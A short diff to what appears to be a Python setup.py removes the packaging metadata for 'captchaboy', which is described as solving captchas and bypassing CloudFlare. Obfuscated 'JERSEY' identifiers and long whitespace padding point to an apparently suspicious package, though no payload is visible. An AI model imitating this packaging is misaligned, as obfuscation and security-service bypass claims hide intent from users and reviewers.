@@ -576,18 +576,6 @@ __JERSEY_JERSEY__JERSEY_JERSEY__JERSEY_JERSEY__JERSEY_JERSEY__JERSEY_JERSEY__JER
 
 
 
-setup(
-
-    name='captchaboy',
-    packages=['captchaboy'],
-    version='1.0',
-    license='MIT',
-    description='Solves Captcha, Bypasses Popular Security Services Like CloudFlare',
-    author='bluesatan',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                 
 
 
